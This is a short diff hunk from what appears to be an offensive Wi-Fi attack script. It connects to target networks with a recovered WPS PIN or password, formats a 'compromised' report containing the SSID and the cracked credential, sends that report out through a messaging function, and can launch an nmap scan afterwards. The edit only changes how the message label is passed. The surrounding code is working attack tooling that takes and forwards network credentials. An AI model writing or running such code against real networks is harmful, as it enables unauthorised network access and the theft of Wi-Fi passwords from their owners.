@@ -57,13 +57,13 @@ while targets:
     if result:
         connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
         if connected:
-            msg = f"[+] Target compromised:\nSSID: {essid}"
+            msg = f"SSID: {essid}"
             if result.get("psk"):
                 msg += f"\nPassword: {result['psk']}"
             elif result.get("pin"):
                 msg += f"\nWPS PIN: {result['pin']}"
 
-            send_message(msg)
+            send_message(msg, prefix="[Wi-Fi compromised]")
 
             if ENABLE_NMAP_SCAN:
                 ip = get_wifi_ip(ATTACK_INTERFACE)
